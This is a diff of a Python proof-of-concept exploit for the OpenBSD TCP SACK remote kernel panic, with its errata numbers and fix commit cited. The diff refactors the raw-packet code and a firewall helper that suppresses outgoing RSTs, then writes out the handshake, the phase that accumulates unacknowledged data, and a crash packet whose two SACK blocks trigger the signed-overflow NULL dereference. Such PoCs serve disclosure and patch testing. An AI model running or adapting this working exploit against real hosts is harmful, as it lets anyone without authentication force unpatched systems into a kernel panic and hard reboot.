@@ -1,20 +1,23 @@
 #!/usr/bin/env python3
 #
+#
 # OpenBSD TCP SACK Remote Kernel Denial of Service
 # Errata: OpenBSD 7.8 #025 / 7.7 #031 (March 25, 2026)
 #
-# A NULL pointer dereference in tcp_sack_option() allows a remote attacker
-# to panic an unpatched OpenBSD kernel via crafted TCP SACK options. The
-# vulnerability stems from missing validation of sack.start against snd_una
-# and a missing NULL pointer guard in the SACK hole append path. Signed
-# integer overflow in the SEQ_LT/SEQ_LEQ macros causes contradictory
-# comparison results, allowing an attacker to delete a SACK hole (setting
-# the list pointer to NULL) and then trigger the append path which
-# dereferences the NULL pointer.
+# A NULL pointer dereference in tcp_sack_option() allows a remote
+# attacker to panic an unpatched OpenBSD kernel via crafted TCP SACK
+# options. The vulnerability stems from missing validation of
+# sack.start against snd_una and a missing NULL pointer guard in the
+# SACK hole append path. Signed integer overflow in the SEQ_LT/SEQ_LEQ
+# macros causes contradictory comparison results, allowing an attacker
+# to delete a SACK hole (setting the list pointer to NULL) and then
+# trigger the append path which dereferences the NULL pointer.
 #
-# Affected:  OpenBSD <= 7.8 (unpatched), likely all versions since ~1999
+# Affected:  OpenBSD 7.8 (before errata #025), 7.7 (before errata #031).
+#            The vulnerable code dates to approximately 1999 but
+#            exploitability of older versions has not been verified.
 # Fixed:     commit 0e8206e596ad in sys/netinet/tcp_input.c
-# Severity:  Remote DoS (kernel panic, requires reboot)
+# Severity:  Remote DoS (kernel panic, requires hard reboot)
 # Auth:      None — any TCP connection suffices
 #
 # References:
@@ -22,22 +25,25 @@
 #   https://github.com/openbsd/src/commit/0e8206e596add74fef1653b4472de6b3723c435f
 #
 # Requirements:
-#   - Root or CAP_NET_RAW (raw sockets)
+#   - Root privileges (raw sockets and firewall manipulation)
+#   - Linux attack host (raw socket IP_HDRINCL behavior assumed)
 #   - Direct L2/L3 path to target (not through a TCP proxy or NAT)
-#   - Outgoing RST packets to target must be suppressed:
-#       iptables -A OUTPUT -p tcp --tcp-flags RST RST -d <target> -j DROP
-#   - Target must have TCP SACK enabled (default on OpenBSD)
+#   - Target must be running unpatched OpenBSD with TCP SACK enabled
 #   - Target must have at least one listening TCP service
 #
 # Limitations:
-#   - Does NOT work through QEMU user-mode NAT (use TAP/bridge instead)
-#   - Does NOT affect non-OpenBSD systems (different TCP SACK implementation)
-#   - Patched systems (errata #025/#031) will silently drop the crafted SACK
+#   - Does NOT work through QEMU user-mode NAT (use TAP/bridge)
+#   - Does NOT affect non-OpenBSD systems
+#   - Patched systems silently drop the crafted SACK
+#   - IPv4 only
 #
 # Usage:
 #   python3 poc_sack.py <target_ip> [target_port]
 #
 
+import argparse
+import atexit
+import os
 import socket
 import struct
 import subprocess
@@ -46,242 +52,7 @@ import time
 
 
 # ---------------------------------------------------------------------------
-# Network helpers
-# ---------------------------------------------------------------------------
-
-def tcp_checksum(src, dst, tcp_segment):
-    """Compute TCP checksum over pseudo-header + segment."""
-    pseudo = struct.pack('!4s4sBBH',
-                         socket.inet_aton(src),
-                         socket.inet_aton(dst),
-                         0, 6, len(tcp_segment))
-    data = pseudo + tcp_segment
-    if len(data) % 2:
-        data += b'\x00'
-    words = struct.unpack('!%dH' % (len(data) // 2), data)
-    total = sum(words)
-    total = (total >> 16) + (total & 0xffff)
-    total += total >> 16
-    return ~total & 0xffff
-
-
-def build_packet(src_ip, dst_ip, src_port, dst_port,
-                 seq, ack, flags, options=b'', payload=b''):
-    """Construct a raw IP + TCP packet with correct checksums."""
-
-    # Pad TCP options to 4-byte boundary.
-    while len(options) % 4:
-        options += b'\x01'  # NOP padding
-
-    tcp_header_len = 20 + len(options)
-    data_offset = (tcp_header_len // 4) << 4
-
-    # Build TCP header with zero checksum for initial calculation.
-    tcp_header = struct.pack('!HHIIBBHHH',
-                             src_port, dst_port,
-                             seq & 0xFFFFFFFF,
-                             ack & 0xFFFFFFFF,
-                             data_offset, flags,
-                             32768,  # window size
-                             0,      # checksum placeholder
-                             0)      # urgent pointer
-
-    tcp_segment = tcp_header + options + payload
-    csum = tcp_checksum(src_ip, dst_ip, tcp_segment)
-
-    # Rebuild with correct checksum.
-    tcp_header = struct.pack('!HHIIBBHHH',
-                             src_port, dst_port,
-                             seq & 0xFFFFFFFF,
-                             ack & 0xFFFFFFFF,
-                             data_offset, flags,
-                             32768, csum, 0)
-
-    tcp_segment = tcp_header + options + payload
-
-    # IP header (kernel fills checksum for IPPROTO_RAW).
-    ip_header = struct.pack('!BBHHHBBH4s4s',
-                            0x45,    # version + IHL
-                            0,       # DSCP/ECN
-                            20 + len(tcp_segment),
-                            54321,   # identification
-                            0x4000,  # flags (DF)
-                            64,      # TTL
-                            6,       # protocol (TCP)
-                            0,       # checksum (kernel fills)
-                            socket.inet_aton(src_ip),
-                            socket.inet_aton(dst_ip))
-
-    return ip_header + tcp_segment
-
-
-def build_sack_option(blocks):
-    """Encode one or more SACK blocks as a TCP option (kind=5)."""
-    payload = b''
-    for start, end in blocks:
-        payload += struct.pack('!II', start & 0xFFFFFFFF, end & 0xFFFFFFFF)
-    return struct.pack('BB', 5, 2 + len(payload)) + payload
-
-
-def build_syn_options():
-    """MSS 1460 + SACK Permitted, padded to 4-byte boundary."""
-    mss = struct.pack('!BBH', 2, 4, 1460)
-    sack_ok = b'\x04\x02'
-    pad = b'\x01\x01'
-    return mss + sack_ok + pad
-
-
-def receive_packet(raw_socket, expected_src, expected_sport, local_port,
-                   timeout=5):
-    """Wait for a TCP packet from the expected source."""
-    deadline = time.time() + timeout
-    while time.time() < deadline:
-        try:
-            remaining = max(0.1, deadline - time.time())
-            raw_socket.settimeout(remaining)
-            data, _ = raw_socket.recvfrom(65535)
-        except socket.timeout:
-            return None
-
-        if len(data) < 40:
-            continue
-
-        ip_header_len = (data[0] & 0x0F) * 4
-        src_ip = socket.inet_ntoa(data[12:16])
-        if src_ip != expected_src:
-            continue
-
-        tcp_data = data[ip_header_len:]
-        sport, dport, seq, ack_num = struct.unpack('!HHII', tcp_data[:12])
-        if dport != local_port or sport != expected_sport:
-            continue
-
-        flags = tcp_data[13]
-        window = struct.unpack('!H', tcp_data[14:16])[0]
-        tcp_header_len = ((tcp_data[12] >> 4) & 0xF) * 4
-        payload = tcp_data[tcp_header_len:]
-
-        return (seq, ack_num, flags, payload, window)
-
-    return None
-
-
-def detect_local_ip(target):
-    """Determine which local IP routes to the target."""
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect((target, 1))
-    local = s.getsockname()[0]
-    s.close()
-    return local
-
-
-def find_iptables():
-    """Locate iptables or iptables-legacy binary."""
-    for name in ['iptables', 'iptables-legacy', '/usr/sbin/iptables',
-                 '/sbin/iptables']:
-        try:
-            result = subprocess.run([name, '--version'],
-                                   capture_output=True, timeout=3)
-            if result.returncode == 0:
-                return name
-        except (FileNotFoundError, Exception):
-            continue
-
-    # NixOS and other systems may use nft directly.
-    for name in ['nft', '/usr/sbin/nft']:
-        try:
-            result = subprocess.run([name, '--version'],
-                                   capture_output=True, timeout=3)
-            if result.returncode == 0:
-                return None  # signal to use nft path
-        except (FileNotFoundError, Exception):
-            continue
-
-    return None
-
-
-def check_rst_rule(target):
-    """Check if an RST suppression rule is already in place."""
-    ipt = find_iptables()
-    if ipt:
-        try:
-            result = subprocess.run(
-                [ipt, '-C', 'OUTPUT', '-p', 'tcp',
-                 '--tcp-flags', 'RST', 'RST', '-d', target, '-j', 'DROP'],
-                capture_output=True, timeout=3)
-            return result.returncode == 0
-        except Exception:
-            pass
-
-    # Check nft for an existing rule.
-    try:
-        result = subprocess.run(['nft', 'list', 'ruleset'],
-                               capture_output=True, text=True, timeout=3)
-        if target in result.stdout and 'rst' in result.stdout.lower():
-            return True
-    except Exception:
-        pass
-
-    return False
-
-
-def add_rst_rule(target):
-    """Add RST suppression rule. Returns ('iptables'|'nft'|None, success)."""
-    ipt = find_iptables()
-
-    # Try iptables first.
-    if ipt:
-        result = subprocess.run(
-            [ipt, '-A', 'OUTPUT', '-p', 'tcp',
-             '--tcp-flags', 'RST', 'RST', '-d', target, '-j', 'DROP'],
-            capture_output=True, text=True)
-        if result.returncode == 0:
-            return ('iptables', ipt, True)
-        # iptables exists but failed — report error.
-        return ('iptables', ipt, False)
-
-    # Fall back to nft.
-    # Use a single atomic ruleset to avoid partial failures.
-    nft_script = (
-        f'table ip sack_poc {{\n'
-        f'  chain output {{\n'
-        f'    type filter hook output priority -300; policy accept;\n'
-        f'    tcp flags rst ip daddr {target} drop\n'
-        f'  }}\n'
-        f'}}\n'
-    )
-    result = subprocess.run(['nft', '-f', '-'],
-                           input=nft_script,
-                           capture_output=True, text=True)
-    if result.returncode == 0:
-        return ('nft', 'nft', True)
-    return ('nft', 'nft', False)
-
-
-def remove_rst_rule(target, method, binary):
-    """Remove the RST suppression rule we added."""
-    if method == 'iptables':
-        subprocess.run(
-            [binary, '-D', 'OUTPUT', '-p', 'tcp',
-             '--tcp-flags', 'RST', 'RST', '-d', target, '-j', 'DROP'],
-            capture_output=True)
-    elif method == 'nft':
-        subprocess.run(['nft', 'delete table ip sack_poc'],
-                      capture_output=True)
-
-
-def flush_socket(sock):
-    """Drain any stale packets from a raw socket."""
-    sock.settimeout(0.1)
-    while True:
-        try:
-            sock.recvfrom(65535)
-        except Exception:
-            break
-
-
-# ---------------------------------------------------------------------------
-# Exploit
+# TCP constants
 # ---------------------------------------------------------------------------
 
 TCP_SYN     = 0x02
@@ -289,256 +60,532 @@ TCP_ACK     = 0x10
 TCP_PSH_ACK = 0x18
 TCP_SYN_ACK = 0x12
 
+
+# ---------------------------------------------------------------------------
+# Packet construction
+# ---------------------------------------------------------------------------
+
+def _ones_complement_sum(data):
+    """RFC 1071 ones-complement checksum over a byte buffer."""
+    if len(data) % 2:
+        data += b'\x00'
+    total = sum(struct.unpack('!%dH' % (len(data) // 2), data))
+    total = (total >> 16) + (total & 0xffff)
+    total += total >> 16
+    return ~total & 0xffff
+
+
+def build_tcp_segment(src_ip, dst_ip, src_port, dst_port,
+                      seq, ack, flags, options=b'', payload=b''):
+    """Build a TCP segment with correct checksum.
+
+    Returns the complete TCP segment (header + options + payload) and
+    the computed checksum. Does not include the IP header.
+    """
+    # Pad options to 4-byte boundary with NOP (kind=1).
+    while len(options) % 4:
+        options += b'\x01'
+
+    header_len = 20 + len(options)
+    data_offset = (header_len // 4) << 4
+
+    # Assemble with zero checksum for computation.
+    header = struct.pack(
+        '!HHIIBBHHH',
+        src_port, dst_port,
+        seq & 0xFFFFFFFF, ack & 0xFFFFFFFF,
+        data_offset, flags,
+        32768,  # window
+        0,      # checksum (placeholder)
+        0,      # urgent pointer
+    )
+    segment = header + options + payload
+
+    pseudo_header = struct.pack(
+        '!4s4sBBH',
+        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
+        0, 6, len(segment),
+    )
+    csum = _ones_complement_sum(pseudo_header + segment)
+
+    # Rebuild with computed checksum.
+    header = struct.pack(
+        '!HHIIBBHHH',
+        src_port, dst_port,
+        seq & 0xFFFFFFFF, ack & 0xFFFFFFFF,
+        data_offset, flags,
+        32768, csum, 0,
+    )
+    return header + options + payload
+
+
+def build_ip_packet(src_ip, dst_ip, tcp_segment):
+    """Wrap a TCP segment in an IPv4 header.
+
+    The IP checksum field is left zero; the Linux kernel fills it
+    when sending via IPPROTO_RAW with IP_HDRINCL.
+    """
+    total_len = 20 + len(tcp_segment)
+    return struct.pack(
+        '!BBHHHBBH4s4s',
+        0x45, 0, total_len,
+        54321, 0x4000,
+        64, 6, 0,
+        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
+    ) + tcp_segment
+
+
+def build_packet(src_ip, dst_ip, src_port, dst_port,
+                 seq, ack, flags, options=b'', payload=b''):
+    """Construct a complete raw IP+TCP packet."""
+    seg = build_tcp_segment(src_ip, dst_ip, src_port, dst_port,
+                            seq, ack, flags, options, payload)
+    return build_ip_packet(src_ip, dst_ip, seg)
+
+
+def encode_sack_option(blocks):
+    """Encode SACK blocks as a TCP option (kind=5).
+
+    Each block is a (start, end) tuple of 32-bit sequence numbers.
+    """
+    data = b''.join(
+        struct.pack('!II', s & 0xFFFFFFFF, e & 0xFFFFFFFF)
+        for s, e in blocks
+    )
+    return struct.pack('BB', 5, 2 + len(data)) + data
+
+
+def encode_syn_options():
+    """MSS 1460 + SACK-Permitted, NOP-padded to 4 bytes."""
+    mss = struct.pack('!BBH', 2, 4, 1460)
+    sack_ok = b'\x04\x02'
+    return mss + sack_ok + b'\x01\x01'
+
+
+# ---------------------------------------------------------------------------
+# Raw socket receive
+# ---------------------------------------------------------------------------
+
+def receive_tcp(raw_sock, expected_src, expected_sport, local_port,
+                timeout=5.0):
+    """Block until a matching TCP packet arrives or timeout.
+
+    Returns (seq, ack, flags, payload, window) or None.
+    Only matches packets from expected_src:expected_sport to local_port.
+    """
+    deadline = time.monotonic() + timeout
+    while True:
+        remaining = deadline - time.monotonic()
+        if remaining <= 0:
+            return None
+        try:
+            raw_sock.settimeout(max(0.05, remaining))
+            data, _ = raw_sock.recvfrom(65535)
+        except socket.timeout:
+            return None
+
+        if len(data) < 40:
+            continue
+        ihl = (data[0] & 0x0F) * 4
+        if socket.inet_ntoa(data[12:16]) != expected_src:
+            continue
+
+        tcp = data[ihl:]
+        if len(tcp) < 20:
+            continue
+        sport, dport, seq, ack = struct.unpack('!HHII', tcp[:12])
+        if dport != local_port or sport != expected_sport:
+            continue
+
+        flags = tcp[13]
+        window = struct.unpack('!H', tcp[14:16])[0]
+        thlen = ((tcp[12] >> 4) & 0xF) * 4
+        payload = tcp[thlen:]
+        return (seq, ack, flags, payload, window)
+
+
+def flush_recv_buffer(sock):
+    """Drain stale packets from a raw socket."""
+    sock.settimeout(0.05)
+    try:
+        while True:
+            sock.recvfrom(65535)
+    except socket.timeout:
+        pass
+
+
+# ---------------------------------------------------------------------------
+# Firewall rule management
+# ---------------------------------------------------------------------------
+
+class FirewallRule:
+    """Context manager for RST suppression rules.
+
+    Ensures cleanup even on exceptions or early exits.
+    """
+
+    def __init__(self, target):
+        self.target = target
+        self.method = None   # 'iptables' or 'nft'
+        self.binary = None   # path to iptables binary
+        self.active = False
+
+    def _find_iptables(self):
+        for name in ['iptables', 'iptables-legacy',
+                     '/usr/sbin/iptables', '/sbin/iptables']:
+            try:
+                r = subprocess.run([name, '--version'],
+                                  capture_output=True, timeout=3)
+                if r.returncode == 0:
+                    return name
+            except (FileNotFoundError, subprocess.TimeoutExpired):
+                continue
+        return None
+
+    def _has_nft(self):
+        for name in ['nft', '/usr/sbin/nft']:
+            try:
+                r = subprocess.run([name, '--version'],
+                                  capture_output=True, timeout=3)
+                if r.returncode == 0:
+                    return True
+            except (FileNotFoundError, subprocess.TimeoutExpired):
+                continue
+        return False
+
+    def check(self):
+        """Return True if an RST suppression rule already exists."""
+        ipt = self._find_iptables()
+        if ipt:
+            try:
+                r = subprocess.run(
+                    [ipt, '-C', 'OUTPUT', '-p', 'tcp',
+                     '--tcp-flags', 'RST', 'RST',
+                     '-d', self.target, '-j', 'DROP'],
+                    capture_output=True, timeout=3)
+                if r.returncode == 0:
+                    return True
+            except (FileNotFoundError, subprocess.TimeoutExpired):
+                pass
+
+        try:
+            r = subprocess.run(['nft', 'list', 'table', 'ip', 'sack_poc'],
+                              capture_output=True, text=True, timeout=3)
+            if r.returncode == 0 and self.target in r.stdout:
+                return True
+        except (FileNotFoundError, subprocess.TimeoutExpired):
+            pass
+
+        return False
+
+    def add(self):
+        """Add RST suppression. Returns True on success."""
+        ipt = self._find_iptables()
+        if ipt:
+            r = subprocess.run(
+                [ipt, '-A', 'OUTPUT', '-p', 'tcp',
+                 '--tcp-flags', 'RST', 'RST',
+                 '-d', self.target, '-j', 'DROP'],
+                capture_output=True, text=True)
+            if r.returncode == 0:
+                self.method = 'iptables'
+                self.binary = ipt
+                self.active = True
+                return True
+
+        if self._has_nft():
+            script = (
+                f'table ip sack_poc {{\n'
+                f'  chain output {{\n'
+                f'    type filter hook output priority -300; policy accept;\n'
+                f'    tcp flags rst ip daddr {self.target} drop\n'
+                f'  }}\n'
+                f'}}\n'
+            )
+            r = subprocess.run(['nft', '-f', '-'], input=script,
+                              capture_output=True, text=True)
+            if r.returncode == 0:
+                self.method = 'nft'
+                self.active = True
+                return True
+
+        return False
+
+    def remove(self):
+        """Remove RST suppression rule if we added one."""
+        if not self.active:
+            return
+        if self.method == 'iptables':
+            subprocess.run(
+                [self.binary, '-D', 'OUTPUT', '-p', 'tcp',
+                 '--tcp-flags', 'RST', 'RST',
+                 '-d', self.target, '-j', 'DROP'],
+                capture_output=True)
+        elif self.method == 'nft':
+            subprocess.run(['nft', 'delete', 'table', 'ip', 'sack_poc'],
+                          capture_output=True)
+        self.active = False
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *_):
+        self.remove()
+
+
+# ---------------------------------------------------------------------------
+# Network helpers
+# ---------------------------------------------------------------------------
+
+def detect_local_ip(target):
+    """Determine which local IP routes to the target."""
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect((target, 1))
+        return s.getsockname()[0]
+    finally:
+        s.close()
+
+
+def is_host_alive(target, timeout=3):
+    """Probe whether host responds to ICMP echo."""
+    try:
+        r = subprocess.run(
+            ['ping', '-c', '1', '-W', str(timeout), target],
+            capture_output=True, text=True, timeout=timeout + 2)
+        return '1 received' in r.stdout
+    except (subprocess.TimeoutExpired, FileNotFoundError):
+        return False
+
+
+# ---------------------------------------------------------------------------
+# Exploit
+# ---------------------------------------------------------------------------
+
 def exploit(target, port):
-    """
-    Execute the SACK crash against the target.
+    """Execute the SACK crash against the target.
 
-    Returns True if the target appears to have crashed, False otherwise.
+    Returns True if the target appears to have crashed.
     """
-
+    # Resolve local address and pick an ephemeral source port.
     local_ip = detect_local_ip(target)
-    local_port = 44444 + int(time.time() * 1000) % 10000
-    rst_rule_added = False  # track if we added it, so we can clean up
+    local_port = 40000 + int(time.time() * 1000) % 20000
 
-    print(f"[*] OpenBSD SACK Remote Kernel DoS (Errata #025)")
-    print(f"[*] Target:  {target}:{port}")
-    print(f"[*] Source:  {local_ip}:{local_port}")
+    print(f'[*] OpenBSD SACK Remote Kernel DoS (Errata #025)')
+    print(f'[*] Target:  {target}:{port}')
+    print(f'[*] Source:  {local_ip}:{local_port}')
     print()
 
-    # --- Preflight checks ---
+    # --- Preflight: RST suppression ---
+    # The local kernel will RST our raw-socket TCP connection unless
+    # outgoing RSTs to the target are suppressed.  This is because the
+    # kernel sees a SYN-ACK for a connection it never opened and sends
+    # RST, tearing down the connection before we can accumulate
+    # unacknowledged server data.
 
-    # This exploit only affects OpenBSD's tcp_sack_option() implementation.
-    # Other TCP stacks (Linux, FreeBSD, Windows) are not vulnerable.
-    # We cannot reliably fingerprint the OS before the crash attempt, but
-    # we check the RST suppression rule which is required regardless.
+    fw = FirewallRule(target)
+    atexit.register(fw.remove)  # safety net for unclean exits
 
-    if not check_rst_rule(target):
-        print(f"[!] No iptables RST suppression rule detected.")
-        print(f"    The local kernel will RST our raw TCP connection before")
-        print(f"    the server can send data, causing the exploit to fail.")
+    if not fw.check():
+        print('[!] No RST suppression rule detected.')
+        print('    The local kernel will RST our raw TCP connection,')
+        print('    preventing the exploit from accumulating unacked data.')
         print()
-        print(f"    NOTE: This exploit ONLY affects OpenBSD. Linux, FreeBSD,")
-        print(f"    and other operating systems are not vulnerable.")
+        print('    NOTE: This exploit ONLY affects OpenBSD.')
         print()
         try:
-            answer = input(f"    Add RST rule automatically? [y/N] ")
+            answer = input('    Add rule automatically? [y/N] ').strip()
         except (EOFError, KeyboardInterrupt):
-            answer = 'n'
-        if answer.strip().lower() == 'y':
-            method, binary, success = add_rst_rule(target)
-            if success:
-                rst_rule_added = (method, binary)
-                print(f"    [+] RST rule added via {method} "
-                      f"(will be removed on exit).")
-            else:
-                print(f"    [-] Failed to add rule via {method}.")
-                print(f"    Add it manually and re-run.")
-                return False
-        else:
-            print(f"    Aborting. Add the rule and re-run.")
+            answer = ''
+        if answer.lower() != 'y':
+            print('    Aborting.')
             return False
+        if not fw.add():
+            print(f'    [-] Failed to add rule (tried iptables and nft).')
+            print(f'    Add manually:')
+            print(f'      iptables -A OUTPUT -p tcp '
+                  f'--tcp-flags RST RST -d {target} -j DROP')
+            return False
+        print(f'    [+] RST rule added via {fw.method} '
+              f'(removed on exit).')
         print()
 
-    # Open raw sockets for sending and receiving.
+    # --- Open raw sockets ---
     send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                               socket.IPPROTO_RAW)
     send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 
     recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                               socket.IPPROTO_TCP)
-    flush_socket(recv_sock)
+    flush_recv_buffer(recv_sock)
+
+    try:
+        return _run_exploit(send_sock, recv_sock, fw,
+                            local_ip, local_port, target, port)
+    finally:
+        send_sock.close()
+        recv_sock.close()
+        fw.remove()
+
+
+def _run_exploit(send_sock, recv_sock, fw,
+                 local_ip, local_port, target, port):
+    """Core exploit logic, separated for clean resource management."""
+
+    def send(pkt):
+        send_sock.sendto(pkt, (target, 0))
+
+    def recv(timeout=5.0):
+        return receive_tcp(recv_sock, target, port, local_port, timeout)
 
     # ------------------------------------------------------------------
-    # Phase 1 — TCP handshake (raw, to avoid kernel auto-ACK behavior)
+    # Phase 1 — TCP handshake via raw sockets
     # ------------------------------------------------------------------
+    # We perform the handshake ourselves rather than using a kernel
+    # socket so that we control ACK behavior.  The kernel never learns
+    # about this connection, so it cannot send automatic ACKs for
+    # server data, which is essential for the exploit.
 
-    print("[1] Establishing TCP connection...")
+    print('[1] Establishing TCP connection...')
+    send(build_packet(local_ip, target, local_port, port,
+                      100000, 0, TCP_SYN, options=encode_syn_options()))
 
-    initial_seq = 100000
-    syn = build_packet(local_ip, target, local_port, port,
-                       initial_seq, 0, TCP_SYN,
-                       options=build_syn_options())
-    send_sock.sendto(syn, (target, 0))
-
-    response = receive_packet(recv_sock, target, port, local_port)
-    if response is None or response[2] != TCP_SYN_ACK:
-        print("    [-] No SYN-ACK received.")
-        print("        Possible causes:")
-        print("        - Target is down or port is not open")
-        print("        - Outgoing RST not blocked (kernel killed our SYN)")
-        print("        - Firewall between attacker and target")
-        print("        - Not a direct network path (NAT/proxy in the way)")
+    resp = recv()
+    if resp is None or resp[2] != TCP_SYN_ACK:
+        print('    [-] No SYN-ACK received.')
+        if resp is not None:
+            print(f'        Got flags=0x{resp[2]:02x} instead of SYN-ACK.')
+        print('        Check: target up? port open? RSTs blocked?')
         return False
 
-    server_isn = response[0]
-    our_seq = response[1]       # our ISN + 1
-    snd_una = server_isn + 1    # server's first data sequence number
-    syn_ack_window = response[4]
+    server_isn, our_seq = resp[0], resp[1]
+    snd_una = (server_isn + 1) & 0xFFFFFFFF
+    window = resp[4]
 
-    # OpenBSD SYN-ACK typically uses window size 16384. Other common values:
-    #   Linux: 65535 or 29200    FreeBSD: 65535    Windows: 8192/65535
-    # This is a heuristic, not definitive.
-    if syn_ack_window != 16384:
-        print(f"    [!] SYN-ACK window = {syn_ack_window} (OpenBSD typically "
-              f"uses 16384).")
-        print(f"        Target may not be OpenBSD. This exploit ONLY affects "
-              f"OpenBSD.")
-        print(f"        Continuing anyway...")
+    # Heuristic OS check: OpenBSD SYN-ACK window is typically 16384.
+    if window != 16384:
+        print(f'    [!] SYN-ACK window={window} (OpenBSD uses 16384).')
+        print(f'        Target may not be OpenBSD.')
         print()
 
-    # Complete the three-way handshake.
-    ack = build_packet(local_ip, target, local_port, port,
-                       our_seq, snd_una, TCP_ACK)
-    send_sock.sendto(ack, (target, 0))
-
-    print(f"    [+] Connected. Server ISN: {server_isn}")
+    # Complete three-way handshake.
+    send(build_packet(local_ip, target, local_port, port,
+                      our_seq, snd_una, TCP_ACK))
+    print(f'    [+] Connected (server ISN={server_isn}).')
 
     # ------------------------------------------------------------------
     # Phase 2 — Accumulate unacknowledged server data
     # ------------------------------------------------------------------
+    # The server must have snd_max > snd_una for SACK holes to exist.
+    # We receive the banner, ACK it, then send a client greeting to
+    # trigger additional server data (SSH KEX_INIT, HTTP response, etc.)
+    # which we intentionally do NOT acknowledge.
 
-    print("[2] Accumulating unacknowledged server data...")
+    print('[2] Accumulating unacknowledged server data...')
 
-    # Receive the server's initial data (e.g., SSH banner).
-    response = receive_packet(recv_sock, target, port, local_port, timeout=3)
-    if response is not None and len(response[3]) > 0:
-        snd_una = (response[0] + len(response[3])) & 0xFFFFFFFF
-        banner_text = response[3][:40]
-        print(f"    [+] Received {len(response[3])} bytes: {banner_text}")
+    resp = recv(timeout=3.0)
+    if resp is not None and len(resp[3]) > 0:
+        data_end = (resp[0] + len(resp[3])) & 0xFFFFFFFF
+        snd_una = data_end
+        print(f'    [+] Banner: {resp[3][:40]}')
 
-    # Acknowledge the banner and send a client greeting to trigger
-    # additional server data (SSH KEX_INIT, HTTP response, etc.).
+    # Acknowledge the banner and send a greeting.
     if port == 22:
-        client_data = b"SSH-2.0-OpenSSH_9.9\r\n"
+        greeting = b'SSH-2.0-OpenSSH_9.9\r\n'
     else:
-        client_data = b"GET / HTTP/1.0\r\nHost: target\r\n\r\n"
+        greeting = b'GET / HTTP/1.0\r\nHost: target\r\n\r\n'
 
-    pkt = build_packet(local_ip, target, local_port, port,
-                       our_seq, snd_una, TCP_PSH_ACK,
-                       payload=client_data)
-    send_sock.sendto(pkt, (target, 0))
-    our_seq = (our_seq + len(client_data)) & 0xFFFFFFFF
+    send(build_packet(local_ip, target, local_port, port,
+                      our_seq, snd_una, TCP_PSH_ACK, payload=greeting))
+    our_seq = (our_seq + len(greeting)) & 0xFFFFFFFF
 
-    # Wait for the server's response data, but do NOT acknowledge it.
-    # This ensures snd_max > snd_una on the server, which is required
-    # for the SACK hole machinery to be active.
+    # Collect server response data without acknowledging.
     time.sleep(2)
     snd_max = snd_una
     for _ in range(20):
-        response = receive_packet(recv_sock, target, port, local_port,
-                                  timeout=1)
-        if response is None:
+        resp = recv(timeout=1.0)
+        if resp is None:
             break
-        if len(response[3]) > 0:
-            snd_max = (response[0] + len(response[3])) & 0xFFFFFFFF
+        if len(resp[3]) > 0:
+            end = (resp[0] + len(resp[3])) & 0xFFFFFFFF
+            # Accept only forward-moving sequence numbers.
+            if ((end - snd_una) & 0xFFFFFFFF) < 0x80000000:
+                if ((end - snd_max) & 0xFFFFFFFF) < 0x80000000:
+                    snd_max = end
 
     unacked = (snd_max - snd_una) & 0xFFFFFFFF
-    print(f"    [+] Unacknowledged data: {unacked} bytes "
-          f"(snd_una={snd_una}, snd_max={snd_max})")
+    print(f'    [+] Unacked: {unacked} bytes '
+          f'(snd_una={snd_una}, snd_max={snd_max}).')
 
     if unacked < 400:
-        print(f"    [-] Insufficient unacknowledged data (need >= 400).")
-        print(f"        Possible causes:")
-        print(f"        - RST suppression rule not in place (most common)")
-        print(f"        - Target behind NAT/proxy (QEMU user-mode won't work)")
-        print(f"        - Service did not send enough data after greeting")
-        print(f"        - Connection was reset between phases")
+        print('    [-] Insufficient unacked data (need >= 400).')
+        print('        Most likely cause: RST rule not in place.')
         return False
 
     # ------------------------------------------------------------------
     # Phase 3 — Send the crash packet
     # ------------------------------------------------------------------
     #
-    # The crash packet contains two SACK blocks in a single TCP segment:
+    # One TCP segment carrying two SACK blocks:
     #
-    # Block 1 (normal):
-    #   [snd_una + 346, snd_una + 546]
-    #   This creates a SACK hole [snd_una, snd_una + 346] on the server
-    #   and sets rcv_lastsack = snd_una + 546.
+    # Block 1 (normal): [snd_una+346, snd_una+546]
+    #   Creates hole [snd_una, snd_una+346].
+    #   Sets rcv_lastsack = snd_una+546.
     #
-    # Block 2 (overflow):
-    #   [snd_una + 0x80000190, snd_una + 399]
-    #   The start value is snd_una + 2^31 + 400. Due to signed integer
-    #   overflow in the SEQ_LEQ macro, this value appears to be LESS THAN
-    #   OR EQUAL to the hole's start (snd_una), causing the code to delete
-    #   the hole and set p = NULL. Simultaneously, the SEQ_LT macro
-    #   evaluating rcv_lastsack < sack.start also overflows, returning
-    #   TRUE, which triggers the append code path. The append path then
-    #   dereferences p->next where p is NULL, causing a kernel page fault.
+    # Block 2 (overflow): [snd_una+0x80000190, snd_una+399]
+    #   start = snd_una + 2^31 + 400.  Due to signed overflow in
+    #   SEQ_LEQ, this appears <= hole.start, triggering deletion
+    #   (p = NULL).  The same overflow makes SEQ_LT(rcv_lastsack,
+    #   start) true, triggering the append path.  The append
+    #   dereferences p->next — NULL — and the kernel panics.
     #
-    #   The end value (snd_una + 399) is within the valid send window,
-    #   so it passes all server-side validation checks. The vulnerable
-    #   code does not validate sack.start against snd_una, which is the
-    #   root cause — the fix adds this check.
+    #   end = snd_una + 399, which is within [snd_una, snd_max]
+    #   and passes all validation checks.  The vulnerable code
+    #   does not validate sack.start >= snd_una.
 
-    print("[3] Sending crash packet...")
+    print('[3] Sending crash packet...')
 
     block_normal = (
         (snd_una + 346) & 0xFFFFFFFF,
-        (snd_una + 546) & 0xFFFFFFFF
+        (snd_una + 546) & 0xFFFFFFFF,
     )
     block_overflow = (
         (snd_una + 0x80000000 + 400) & 0xFFFFFFFF,
-        (snd_una + 399) & 0xFFFFFFFF
+        (snd_una + 399) & 0xFFFFFFFF,
     )
 
-    sack_option = build_sack_option([block_normal, block_overflow])
+    sack = encode_sack_option([block_normal, block_overflow])
+    send(build_packet(local_ip, target, local_port, port,
+                      our_seq, snd_una, TCP_ACK, options=sack))
 
-    crash_pkt = build_packet(local_ip, target, local_port, port,
-                             our_seq, snd_una, TCP_ACK,
-                             options=sack_option)
-    send_sock.sendto(crash_pkt, (target, 0))
-
